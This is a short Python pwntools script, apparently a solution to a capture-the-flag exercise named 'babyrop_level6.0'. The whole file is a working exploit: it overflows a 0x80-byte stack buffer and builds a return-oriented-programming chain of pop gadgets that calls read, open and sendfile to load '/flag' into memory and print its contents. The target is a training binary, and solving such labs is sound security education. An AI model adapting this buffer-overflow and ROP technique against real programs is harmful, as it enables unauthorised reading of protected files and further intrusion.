from pwn import *

p = process('/challenge/babyrop_level6.0')

bss = 0x4040a0

read_plt = 0x401160
open_plt = 0x4011d0
sendfile_plt = 0x4011a0

pop_rdi = 0x401d4c
pop_rsi = 0x401d34
pop_rdx = 0x401d3c
pop_rcx = 0x401d44

payload = b"A" * 0x80 + b"B" * 0x8

payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss)
payload += p64(pop_rdx) + p64(6)
payload += p64(read_plt)

payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0)
payload += p64(open_plt)

payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(3)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rcx) + p64(0x1000)
payload += p64(sendfile_plt)

p.send(payload)
p.send(b"/flag\x00")

p.interactive()
